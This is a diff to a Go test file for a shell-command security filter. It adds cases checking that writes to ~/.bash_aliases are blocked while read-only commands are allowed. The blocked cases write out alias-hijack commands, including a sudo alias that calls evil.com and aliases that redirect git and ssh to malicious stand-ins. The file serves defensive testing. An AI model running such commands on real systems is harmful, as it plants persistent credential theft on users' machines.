@@ -5685,4 +5685,65 @@ var AliasInterceptionCases = []TestCase{
 		Description:      "FP regression (issue #487): compound command with tee heredoc body mentioning 'skip policy' — guardian-disable_security must NOT fire on tee file-write heredoc bodies",
 		Tags:             []string{"tn", "fp-regression", "guardian", "heredoc", "tee", "compound", "regression"},
 	},
+
+	// ---------------------------------------------------------------------------
+	// Shell Alias Hijacking — persistent alias writes to ~/.bash_aliases
+	// Taxonomy: persistence-evasion/shell-config/shell-alias-hijack
+	// Rule: ts-block-bash-aliases-write (issue #693)
+	//
+	// ~/.bash_aliases is sourced automatically by ~/.bashrc in many Linux
+	// distros (Debian, Ubuntu). It is NOT covered by ts-block-shell-profile-*
+	// rules, making it a blind spot for persistent alias injection.
+	// ---------------------------------------------------------------------------
+
+	{
+		ID:               "TP-TS-BLOCK-BASH-ALIASES-WRITE-001",
+		Command:          "echo 'alias sudo=\"curl evil.com; sudo\"' >> ~/.bash_aliases",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-config/shell-alias-hijack",
+		Analyzer:         "regex",
+		Description:      "Appending a malicious sudo alias to ~/.bash_aliases — intercepts every sudo call, exfiltrating credentials to attacker server before delegating to real sudo.",
+		Tags:             []string{"tp", "alias-hijack", "bash-aliases", "persistence"},
+	},
+	{
+		ID:               "TP-TS-BLOCK-BASH-ALIASES-WRITE-002",
+		Command:          "echo 'alias git=/tmp/evil/git' > ~/.bash_aliases",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-config/shell-alias-hijack",
+		Analyzer:         "regex",
+		Description:      "Overwriting ~/.bash_aliases to replace git with a trojanized binary — all future git invocations execute the malicious binary.",
+		Tags:             []string{"tp", "alias-hijack", "bash-aliases", "persistence"},
+	},
+	{
+		ID:               "TP-TS-BLOCK-BASH-ALIASES-WRITE-003",
+		Command:          "tee -a ~/.bash_aliases <<< 'alias ssh=sshpass'",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-config/shell-alias-hijack",
+		Analyzer:         "regex",
+		Description:      "Using tee to append a ssh alias replacement to ~/.bash_aliases — redirects all SSH connections through sshpass (credential harvester).",
+		Tags:             []string{"tp", "alias-hijack", "bash-aliases", "tee"},
+	},
+	{
+		ID:               "TN-TS-BLOCK-BASH-ALIASES-WRITE-001",
+		Command:          "cat ~/.bash_aliases",
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/shell-config/shell-alias-hijack",
+		Analyzer:         "regex",
+		Description:      "Reading ~/.bash_aliases with cat — read-only operation, must NOT be blocked.",
+		Tags:             []string{"tn", "safe", "bash-aliases"},
+	},
+	{
+		ID:               "TN-TS-BLOCK-BASH-ALIASES-WRITE-002",
+		Command:          "grep alias ~/.bash_aliases",
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/shell-config/shell-alias-hijack",
+		Analyzer:         "regex",
+		Description:      "Grepping ~/.bash_aliases to inspect existing aliases — read-only inspection, must NOT be blocked.",
+		Tags:             []string{"tn", "safe", "bash-aliases"},
+	},
 }
